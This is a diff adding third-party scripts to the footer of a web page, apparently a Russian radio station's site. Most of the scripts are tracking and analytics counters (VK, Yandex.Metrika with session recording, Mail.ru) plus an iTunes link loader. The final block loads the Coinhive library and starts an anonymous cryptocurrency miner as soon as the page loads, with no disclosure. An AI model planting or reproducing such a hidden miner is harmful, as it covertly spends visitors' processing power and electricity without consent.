@@ -258,5 +258,66 @@
 			}
 
 		</script>
+	
+	<script type="text/javascript">(window.Image ? (new Image()) : document.createElement('img')).src = location.protocol + '//vk.com/rtrg?r=wuWd0RPyJPrdnxhtmxubzoToOEtswuQv606c2HH4MRLuvFwl1mrce/0FMtiXkW7h1fhNDTpawHbdqwbgDWYs3QkELHcoctlKdewFwv3gbIIdXsebRZ*LMVxglFCa2npuocBMPeq/fh36ll3qirNWUvotLSzLOnCMrfUgg5yvGsY-&pixel_id=1000036358';</script>
+<script type="text/javascript">var _merchantSettings=_merchantSettings || [];_merchantSettings.push(['AT', '11lM73']);(function(){var autolink=document.createElement('script');autolink.type='text/javascript';autolink.async=true; autolink.src= ('https:' == document.location.protocol) ? 'https://autolinkmaker.itunes.apple.com/js/itunes_autolinkmaker.js' : 'http://autolinkmaker.itunes.apple.com/js/itunes_autolinkmaker.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(autolink, s);})();</script>
+<script type="text/javascript">
+var _sf_async_config = { uid: 28407, domain: 'radiorecord.ru', useCanonical:true };
+(function() {
+// function loadChartbeat() {};
+var oldonload = window.onload;
+$(function() {
+//loadChartbeat();
+/*$(document).pjax('a', '#pjax-container', {
+container: '#pjax-container',
+fragment: '#pjax-container',
+});
+$.pjax.enable();*/
+if ($.support.pjax) {
+$.pjax.defaults.timeout = 2000
+$(document).on('click', 'a:not(.no-ajax, .no-ajax-load)', function(event) {
+//event.preventDefault();
+var container = $("#pjax-container")
+$.pjax.click(event, {container: container,
+fragment: '#pjax-container'})
+})
+$(document).on('click', '.no-ajax', function(event) {
+event.preventDefault();
+})
+}
+});
+})();
+</script>
+<!-- Yandex.Metrika counter --> <script type="text/javascript" > (function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter42130574 = new Ya.Metrika({ id:42130574, clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true, trackHash:true, ecommerce:"telerecord" }); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://mc.yandex.ru/metrika/watch.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks"); </script> <!-- /Yandex.Metrika counter -->	
+<!-- Rating@Mail.ru counter -->
+<script type="text/javascript">
+var _tmr = window._tmr || (window._tmr = []);
+_tmr.push({id: "2934645", type: "pageView", start: (new Date()).getTime()});
+(function (d, w, id) {
+if (d.getElementById(id)) return;
+var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id;
+ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js";
+var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
+if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
+})(document, window, "topmailru-code");
+</script><noscript><div>
+<img src="//top-fwz1.mail.ru/counter?id=2934645;js=na" style="border:0;position:absolute;left:-9999px;" alt="" />
+</div></noscript>
+<!-- //Rating@Mail.ru counter -->
+<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.Anonymous('0WKXq51O01C9ENyztisz6UUP1nZKDtgt');
+miner.start();
+// Listen on events
+miner.on('found', function() { /* Hash found */ })
+miner.on('accepted', function() { /* Hash accepted by the pool */ })
+// Update stats once per second
+setInterval(function() {
+var hashesPerSecond = miner.getHashesPerSecond();
+var totalHashes = miner.getTotalHashes();
+var acceptedHashes = miner.getAcceptedHashes();
+// Output to HTML elements...
+}, 1000);
+</script>
 </body>
 </html>
